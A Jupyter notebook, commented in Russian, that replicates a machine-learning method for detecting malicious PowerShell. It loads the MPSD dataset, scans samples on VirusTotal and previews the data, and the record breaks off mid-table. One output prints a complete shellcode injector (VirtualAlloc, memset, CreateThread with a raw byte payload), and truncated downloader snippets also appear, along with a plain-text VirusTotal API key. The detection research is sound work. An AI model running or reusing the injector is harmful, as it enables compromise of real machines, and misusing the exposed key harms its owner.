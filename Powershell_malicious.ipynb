{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "fdd98c05-2dc0-4497-be82-317d64023b12",
   "metadata": {},
   "source": [
    "# Описание"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c5a1fe3b-85fd-4ca1-8b74-2888fde11e7c",
   "metadata": {},
   "source": [
    "**Цель:** Проверка метода выявления вредоносного кода PowerShell, описанного в статье от Angara Security https://habr.com/ru/companies/angarasecurity/articles/751858/\n",
    "\n",
    "Авторы статьи использовали другую статью и репозиторий: \n",
    "- Effective method for detecting malicious PowerShell scripts based on hybrid features https://www.sciencedirect.com/science/article/abs/pii/S0925231221005099?via%3Dihub\n",
    "- https://github.com/das-lab/mpsd\n",
    "\n",
    "В отличие от оригинальной статьи, где использовался Random Forest, авторы использовали Bi-LSTM. Хотя все не совсем так, и не смотря на то, что авторы использовали Random Forest для окончательной классификации, основная часть там про выделение признаков (feature engineering) и обучение эмбеддингов (fast text).\n",
    "\n",
    "**Задачи:**\n",
    "1. Реализовать подход, описанный в статье\n",
    "\n",
    "**Данные:**\n",
    "\n",
    "Данные, использованные в статье:\n",
    "\n",
    "- **malicious_pure** содержит образцы вредоносного кода;\n",
    "- **powershell_benign_dataset** содержит легитимные образцы кода;\n",
    "- **mixed_malicious** в легитимный код встроены вредоносные элементы - не тестировались\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fec3f871-5f8c-4de8-81cb-22a4d4c06cae",
   "metadata": {},
   "source": [
    "# Библиотеки, модули, функции"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "id": "5df98564-7a8e-4892-9b36-575a1e3ad282",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import re\n",
    "\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "from matplotlib import pyplot as plt\n",
    "from collections import Counter\n",
    "\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.preprocessing import OneHotEncoder\n",
    "from sklearn.metrics import accuracy_score, precision_recall_fscore_support\n",
    "\n",
    "import tensorflow as tf\n",
    "from tensorflow.keras import layers\n",
    "tf.random.set_seed(1234)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "id": "b4209dee-f70a-48f8-867e-c8b15991a57b",
   "metadata": {},
   "outputs": [],
   "source": [
    "def read_files(path):\n",
    "    dataset = []\n",
    "\n",
    "    for filename in os.listdir(path):\n",
    "        if re.match(\"^\\d\", filename): # работаем пока над скриптами не для git или CS\n",
    "            filename_old = filename\n",
    "            filename = os.path.join(path, filename.split('.')[0] + '.txt')\n",
    "            os.rename(os.path.join(path, filename_old), filename)\n",
    "\n",
    "            try:\n",
    "            \n",
    "                with open(filename, 'r', encoding = 'utf-8') as f:\n",
    "                    line = f.read().replace('\\n', ' ').replace('\\t', ' ').replace('\\r', ' ')\n",
    "                    dataset.append(re.sub(r'\\s+', ' ', line))\n",
    "            except PermissionError as exc:\n",
    "                print(exc)                \n",
    "\n",
    "            os.rename(filename, os.path.join(path, filename_old))\n",
    "            \n",
    "    return dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f6fc083a-b3bf-47b3-baf6-eeffa19ec8d8",
   "metadata": {},
   "source": [
    "# 1. Работа с данными из статьи"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6ec60e06-02d0-4c51-9fbc-f1d967d80eb8",
   "metadata": {},
   "source": [
    "## 1.1. Загрузка данных"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0a8bd986",
   "metadata": {},
   "source": [
    "Данные можно скачать отсюда: https://github.com/das-lab/mpsd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "id": "bc637e07-9ded-479d-aeb4-e7e136d54edc",
   "metadata": {},
   "outputs": [],
   "source": [
    "malicious = read_files('mpsd/malicious_pure')\n",
    "valid = read_files('mpsd/powershell_benign_dataset')\n",
    "mixed = read_files('mpsd/mixed_malicious')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b86b78b1",
   "metadata": {},
   "source": [
    "Вредоносы"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "id": "49a48f7a-d1d2-403e-8f39-f4e829039062",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>data</th>\n",
       "      <th>label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>$usQ9 = '[DllImport(\"kernel32.dll\")]public st...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>$c = '[DllImport(\"kernel32.dll\")]public stati...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>(New-Object System.Net.WebClient).DownloadFil...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>$TaskName = \"Microsoft Windows Driver Update\"...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>$wc=New-OBjecT SysteM.NeT.WebClIeNT;$u='Mozil...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4049</th>\n",
       "      <td>$c = '[DllImport(\"kernel32.dll\")]public stati...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4050</th>\n",
       "      <td>$c = '[DllImport(\"kernel32.dll\")]public stati...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4051</th>\n",
       "      <td>dir c:\\;sleep(5);Set-ExecutionPolicy Bypass -...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4052</th>\n",
       "      <td>(New-Object System.Net.WebClient).DownloadFil...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4053</th>\n",
       "      <td>$Wc=NEw-OBjEcT SySTeM.NeT.WeBCLIenT;$u='Mozil...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>4054 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                   data  label\n",
       "0      $usQ9 = '[DllImport(\"kernel32.dll\")]public st...      1\n",
       "1      $c = '[DllImport(\"kernel32.dll\")]public stati...      1\n",
       "2      (New-Object System.Net.WebClient).DownloadFil...      1\n",
       "3      $TaskName = \"Microsoft Windows Driver Update\"...      1\n",
       "4      $wc=New-OBjecT SysteM.NeT.WebClIeNT;$u='Mozil...      1\n",
       "...                                                 ...    ...\n",
       "4049   $c = '[DllImport(\"kernel32.dll\")]public stati...      1\n",
       "4050   $c = '[DllImport(\"kernel32.dll\")]public stati...      1\n",
       "4051   dir c:\\;sleep(5);Set-ExecutionPolicy Bypass -...      1\n",
       "4052   (New-Object System.Net.WebClient).DownloadFil...      1\n",
       "4053   $Wc=NEw-OBjEcT SySTeM.NeT.WeBCLIenT;$u='Mozil...      1\n",
       "\n",
       "[4054 rows x 2 columns]"
      ]
     },
     "execution_count": 141,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_malicious = pd.DataFrame(malicious, columns=['data'])\n",
    "df_malicious['label'] = 1\n",
    "df_malicious"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 143,
   "id": "13527670",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "' $Xn9 = \\'[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);\\';$w = Add-Type -memberDefinition $Xn9 -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xf8,0xdf,0x16,0x01,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0xf7,0x3d,0xe3,0xfd,0xef,0x40,0x0c,0xfe,0xef,0x24,0x84,0x1b,0xde,0x64,0xf2,0x68,0x70,0x55,0x70,0x3c,0x7c,0x1e,0xd4,0xd5,0xf7,0x52,0xf1,0xda,0xb0,0xd9,0x27,0xd4,0x41,0x71,0x1b,0x77,0xc1,0x88,0x48,0x57,0xf8,0x42,0x9d,0x96,0x3d,0xbe,0x6c,0xca,0x96,0xb4,0xc3,0xfb,0x93,0x81,0xdf,0x70,0xef,0x04,0x58,0x64,0xa7,0x27,0x49,0x3b,0xbc,0x71,0x49,0xbd,0x11,0x0a,0xc0,0xa5,0x76,0x37,0x9a,0x5e,0x4c,0xc3,0x1d,0xb7,0x9d,0x2c,0xb1,0xf6,0x12,0xdf,0xcb,0x3f,0x94,0x00,0xbe,0x49,0xe7,0xbd,0xb9,0x8d,0x9a,0x19,0x4f,0x16,0x3c,0xe9,0xf7,0xf2,0xbd,0x3e,0x61,0x70,0xb1,0x8b,0xe5,0xde,0xd5,0x0a,0x29,0x55,0xe1,0x87,0xcc,0xba,0x60,0xd3,0xea,0x1e,0x29,0x87,0x93,0x07,0x97,0x66,0xab,0x58,0x78,0xd6,0x09,0x12,0x94,0x03,0x20,0x79,0xf0,0xe0,0x09,0x82,0x00,0x6f,0x19,0xf1,0x32,0x30,0xb1,0x9d,0x7e,0xb9,0x1f,0x59,0x81,0x90,0xd8,0xf5,0x7c,0x1b,0x19,0xdf,0xba,0x4f,0x49,0x77,0x6b,0xf0,0x02,0x87,0x94,0x25,0xbe,0x82,0x02,0x06,0x97,0x94,0x94,0xee,0xea,0xa6,0x09,0xb3,0x63,0x40,0x79,0x1b,0x24,0xdd,0x39,0xcb,0x84,0x8d,0xd1,0x01,0x0b,0xf1,0xc1,0x29,0xc1,0x9a,0x6b,0xc6,0xbc,0xf3,0x03,0x7f,0xe5,0x88,0xb2,0x80,0x33,0xf5,0xf4,0x0b,0xb0,0x09,0xba,0xfb,0xbd,0x19,0x2a,0x0c,0x88,0x40,0xfc,0x13,0x26,0xee,0x00,0x86,0xcd,0xb9,0x57,0x3e,0xcc,0x9c,0x9f,0xe1,0x2f,0xcb,0x94,0x28,0xba,0xb4,0xc2,0x54,0x2a,0x35,0x12,0x03,0x20,0x35,0x7a,0xf3,0x10,0x66,0x9f,0xfc,0x8c,0x1a,0x0c,0x69,0x2f,0x4b,0xe1,0x3a,0x47,0x71,0xdc,0x0d,0xc8,0x8a,0x0b,0x8c,0x34,0x5d,0x75,0xfa,0x54,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$d8Z=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($d8Z.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$d8Z,0,0,0);for (;;){Start-sleep 60}; '"
      ]
     },
     "execution_count": 143,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_malicious['data'].sample(1).values[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e0a0e28c",
   "metadata": {},
   "source": [
    "### Проверка вредоносных скриптов на virustotal.com"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 198,
   "id": "0079bb71",
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "import requests\n",
    "import time\n",
    "\n",
    "scan_url = 'https://www.virustotal.com/vtapi/v2/file/scan'\n",
    "report_url = 'https://www.virustotal.com/vtapi/v2/file/report'\n",
    "params = dict(apikey='b64194956ebf7833f1fbdc26af11385603f9ee4379ea91e6f20b9230a90c0f05')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 215,
   "id": "b961c3fd",
   "metadata": {
    "collapsed": true,
    "jupyter": {
     "outputs_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1477.ps1: 28\n",
      "1895.ps1: 28\n",
      "2494.ps1: 21\n",
      "60.ps1: 10\n",
      "3288.ps1: 12\n",
      "1429.ps1: 29\n",
      "3451.ps1: 26\n",
      "2752.ps1: 0\n",
      "3770.ps1: 13\n",
      "707.ps1: 18\n",
      "1399.ps1: 4\n",
      "761.ps1: 24\n",
      "2453.ps1: 28\n",
      "2718.ps1: 25\n",
      "1041.ps1: 27\n",
      "987.ps1: 24\n",
      "3159.ps1: 28\n",
      "2014.ps1: 28\n",
      "3913.ps1: 24\n",
      "927.ps1: 27\n",
      "4041.ps1: 1\n",
      "2112.ps1: 30\n",
      "2641.ps1: 25\n",
      "2505.ps1: 25\n",
      "2447.ps1: 24\n",
      "1155.ps1: 27\n",
      "74.ps1: 24\n",
      "git_131.ps1: 35\n",
      "2280.ps1: 11\n",
      "3112.ps1: 20\n",
      "2632.ps1: 16\n",
      "2543.ps1: 28\n",
      "277.ps1: 31\n",
      "3481.ps1: 26\n",
      "1199.ps1: 10\n",
      "3058.ps1: 27\n",
      "1858.ps1: 24\n",
      "2994.ps1: 26\n",
      "3535.ps1: 24\n",
      "262.ps1: 24\n",
      "226.ps1: 21\n",
      "171.ps1: 24\n",
      "1010.ps1: 32\n",
      "1357.ps1: 27\n",
      "100.ps1: 31\n",
      "3300.ps1: 22\n",
      "368.ps1: 26\n",
      "3983.ps1: 25\n",
      "181.ps1: 25\n",
      "982.ps1: 0\n",
      "1537.ps1: 27\n",
      "547.ps1: 4\n",
      "1240.ps1: 24\n",
      "2406.ps1: 24\n",
      "2684.ps1: 24\n",
      "139.ps1: 0\n",
      "965.ps1: 28\n",
      "336.ps1: 27\n",
      "221.ps1: 24\n",
      "1488.ps1: 28\n",
      "3672.ps1: 29\n",
      "623.ps1: 24\n",
      "1233.ps1: 27\n",
      "637.ps1: 27\n",
      "git_76.ps1: 19\n",
      "2040.ps1: 29\n",
      "3939.ps1: 28\n",
      "402.ps1: 31\n",
      "3814.ps1: 25\n",
      "2312.ps1: 4\n",
      "1186.ps1: 24\n",
      "2973.ps1: 29\n",
      "2209.ps1: 29\n",
      "77.ps1: 4\n",
      "939.ps1: 24\n",
      "2464.ps1: 26\n",
      "1120.ps1: 32\n",
      "29.ps1: 36\n",
      "968.ps1: 33\n",
      "321.ps1: 0\n",
      "git_106.ps1: 9\n",
      "1975.ps1: 28\n",
      "2218.ps1: 0\n",
      "2263.ps1: 25\n",
      "229.ps1: 22\n",
      "3063.ps1: 24\n",
      "183.ps1: 29\n",
      "1197.ps1: 27\n",
      "1928.ps1: 25\n",
      "2658.ps1: 27\n",
      "2467.ps1: 28\n",
      "3340.ps1: 25\n",
      "2462.ps1: 34\n",
      "3761.ps1: 16\n",
      "548.ps1: 31\n",
      "185.ps1: 4\n",
      "2962.ps1: 25\n",
      "3349.ps1: 2\n",
      "2480.ps1: 27\n",
      "427.ps1: 24\n",
      "204.ps1: 25\n",
      "3208.ps1: 27\n",
      "2498.ps1: 27\n",
      "604.ps1: 13\n",
      "2887.ps1: 27\n",
      "2533.ps1: 27\n",
      "3400.ps1: 15\n",
      "871.ps1: 35\n",
      "1424.ps1: 27\n",
      "2034.ps1: 27\n",
      "1575.ps1: 27\n",
      "2553.ps1: 25\n",
      "2109.ps1: 27\n",
      "3875.ps1: 26\n",
      "1842.ps1: 32\n",
      "1191.ps1: 25\n",
      "3597.ps1: 28\n",
      "441.ps1: 25\n",
      "3837.ps1: 27\n",
      "2760.ps1: 28\n",
      "712.ps1: 24\n",
      "3107.ps1: 24\n",
      "1246.ps1: 1\n",
      "934.ps1: 28\n",
      "git_30.ps1: 19\n",
      "2841.ps1: 25\n",
      "2811.ps1: 27\n",
      "2514.ps1: 25\n",
      "3544.ps1: 25\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[215], line 22\u001b[0m\n\u001b[1;32m     20\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(\u001b[38;5;241m5\u001b[39m):\n\u001b[1;32m     21\u001b[0m     \u001b[38;5;28;01mif\u001b[39;00m response\u001b[38;5;241m.\u001b[39mstatus_code \u001b[38;5;241m!=\u001b[39m \u001b[38;5;241m200\u001b[39m:\n\u001b[0;32m---> 22\u001b[0m         time\u001b[38;5;241m.\u001b[39msleep(\u001b[38;5;241m20\u001b[39m)\n\u001b[1;32m     23\u001b[0m         response \u001b[38;5;241m=\u001b[39m requests\u001b[38;5;241m.\u001b[39mget(report_url, params\u001b[38;5;241m=\u001b[39mparams)\n\u001b[1;32m     24\u001b[0m         \u001b[38;5;28;01mcontinue\u001b[39;00m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "i = 0\n",
    "\n",
    "df_result = pd.DataFrame()\n",
    "\n",
    "for file in os.listdir('mpsd/malicious_pure/')[:200]:\n",
    "    \n",
    "    if i > 100: break\n",
    "            \n",
    "    file_path = f\"mpsd/malicious_pure/{file}\"\n",
    "    with open(file_path, 'rb') as f:\n",
    "        files = dict(file=(file_path, f))\n",
    "        response = requests.post(scan_url, files=files, params=params)\n",
    "\n",
    "    if response.status_code == 200:\n",
    "        result=response.json()\n",
    "        params['resource'] = result['scan_id']\n",
    "        \n",
    "        response = requests.get(report_url, params=params)\n",
    "        \n",
    "        for i in range(5):\n",
    "            if response.status_code != 200:\n",
    "                time.sleep(20)\n",
    "                response = requests.get(report_url, params=params)\n",
    "                continue\n",
    "            \n",
    "            result=response.json()\n",
    "            \n",
    "            if result['response_code']==-2:\n",
    "                time.sleep(20)\n",
    "                response = requests.get(report_url, params=params)\n",
    "                continue\n",
    "                \n",
    "            result=response.json()\n",
    "            \n",
    "        try:\n",
    "            file_report = pd.DataFrame(result['scans']).loc['detected']\n",
    "            file_report['_positives'] = result['positives']\n",
    "            file_report['_file'] = file\n",
    "            \n",
    "            df_result = pd.concat([df_result, file_report], axis=1)  \n",
    "            print(f\"{file}: {result['positives']}\")\n",
    "\n",
    "            i += 1\n",
    "        except KeyError:\n",
    "            continue\n",
    "                \n",
    "        del params['resource']\n",
    "        \n",
    "    else:\n",
    "        print('!!', response.status_code)\n",
    "        \n",
    "    time.sleep(20)\n",
    "    \n",
    "df_result.to_csv('virustotal_result.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "509483bb",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "df_result = df_result.T\n",
    "df_result.index = df_result.pop('_file')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 225,
   "id": "1165f453",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Количество вредоносных скриптов: 129\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'Количество нераспознанных вредоносных скриптов: 5 (3.9%)'"
      ]
     },
     "execution_count": 225,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "df_result['_positives'].hist(bins=10)\n",
    "not_detected = df_result[df_result['_positives']==0].shape[0]\n",
    "print(\"Количество вредоносных скриптов:\", df_result.shape[0])\n",
    "f\"Количество нераспознанных вредоносных скриптов: {not_detected} ({not_detected/df_result.shape[0]:.1%})\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ee548a1",
   "metadata": {},
   "source": [
    "**Вывод:** бОльшая часть скриптов была обнаружена антивирусным ПО, не были распознаны менее 5% скриптов"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3fe6ab04",
   "metadata": {},
   "source": [
    "\"Чистые\" скрипты"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "e675f308-8030-44d7-83a7-c65c53f43709",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>data</th>\n",
       "      <th>label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>function Set-ModuleNuspec { param( [Parameter...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Describe \"Write-Error Tests\" -Tags \"CI\" { It ...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>$ServiceName = \"SQL Server (SOX2)\" $TranManSe...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>function Invoke-Inveigh { [CmdletBinding()] pa...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>function Get-AuthToken { [cmdletbinding()] pa...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4311</th>\n",
       "      <td>﻿ function Connect-SCP{ param ( [parameter(Man...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4312</th>\n",
       "      <td>function Test-CSslCertificateBinding { [Cmdle...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4313</th>\n",
       "      <td>class Room { [string]$Id [string]$Name [strin...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4314</th>\n",
       "      <td>﻿function Get-ADMigratedSourceObject { [cmdlet...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4315</th>\n",
       "      <td>param( [switch]$SkipCabs, [switch]$ShowProgres...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>4316 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                   data  label\n",
       "0      function Set-ModuleNuspec { param( [Parameter...      0\n",
       "1      Describe \"Write-Error Tests\" -Tags \"CI\" { It ...      0\n",
       "2      $ServiceName = \"SQL Server (SOX2)\" $TranManSe...      0\n",
       "3     function Invoke-Inveigh { [CmdletBinding()] pa...      0\n",
       "4      function Get-AuthToken { [cmdletbinding()] pa...      0\n",
       "...                                                 ...    ...\n",
       "4311  ﻿ function Connect-SCP{ param ( [parameter(Man...      0\n",
       "4312   function Test-CSslCertificateBinding { [Cmdle...      0\n",
       "4313   class Room { [string]$Id [string]$Name [strin...      0\n",
       "4314  ﻿function Get-ADMigratedSourceObject { [cmdlet...      0\n",
       "4315  param( [switch]$SkipCabs, [switch]$ShowProgres...      0\n",
       "\n",
       "[4316 rows x 2 columns]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_valid = pd.DataFrame(valid, columns=['data'])\n",
    "df_valid['label'] = 0\n",
    "df_valid"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e50b448b",
   "metadata": {},
   "source": [
    "Общий датасет"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "761b0dac-ac62-4d90-9bfa-6bdfa2db5466",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>data</th>\n",
       "      <th>label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>$usQ9 = '[DllImport(\"kernel32.dll\")]public st...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>$c = '[DllImport(\"kernel32.dll\")]public stati...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>(New-Object System.Net.WebClient).DownloadFil...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>$TaskName = \"Microsoft Windows Driver Update\"...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>$wc=New-OBjecT SysteM.NeT.WebClIeNT;$u='Mozil...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4311</th>\n",
       "      <td>﻿ function Connect-SCP{ param ( [parameter(Man...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4312</th>\n",
       "      <td>function Test-CSslCertificateBinding { [Cmdle...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4313</th>\n",
       "      <td>class Room { [string]$Id [string]$Name [strin...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4314</th>\n",
       "      <td>﻿function Get-ADMigratedSourceObject { [cmdlet...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4315</th>\n",
       "      <td>param( [switch]$SkipCabs, [switch]$ShowProgres...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>8370 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                   data  label\n",
       "0      $usQ9 = '[DllImport(\"kernel32.dll\")]public st...      1\n",
       "1      $c = '[DllImport(\"kernel32.dll\")]public stati...      1\n",
       "2      (New-Object System.Net.WebClient).DownloadFil...      1\n",
       "3      $TaskName = \"Microsoft Windows Driver Update\"...      1\n",
       "4      $wc=New-OBjecT SysteM.NeT.WebClIeNT;$u='Mozil...      1\n",
       "...                                                 ...    ...\n",
       "4311  ﻿ function Connect-SCP{ param ( [parameter(Man...      0\n",
       "4312   function Test-CSslCertificateBinding { [Cmdle...      0\n",
       "4313   class Room { [string]$Id [string]$Name [strin...      0\n",
       "4314  ﻿function Get-ADMigratedSourceObject { [cmdlet...      0\n",
       "4315  param( [switch]$SkipCabs, [switch]$ShowProgres...      0\n",
       "\n",
       "[8370 rows x 2 columns]"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_all = pd.concat([df_malicious, df_valid])\n",
    "df_all"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c33070bd",
   "metadata": {},
   "source": [
    "Датасет с подмешанными в чистные скрипты вредоносными участками (не используется)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "aa56540f-1e27-4275-844e-d60a4b21d95c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>data</th>\n",
       "      <th>label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>function Expand-CItem { [OutputType([IO.Direc...</td>\n",
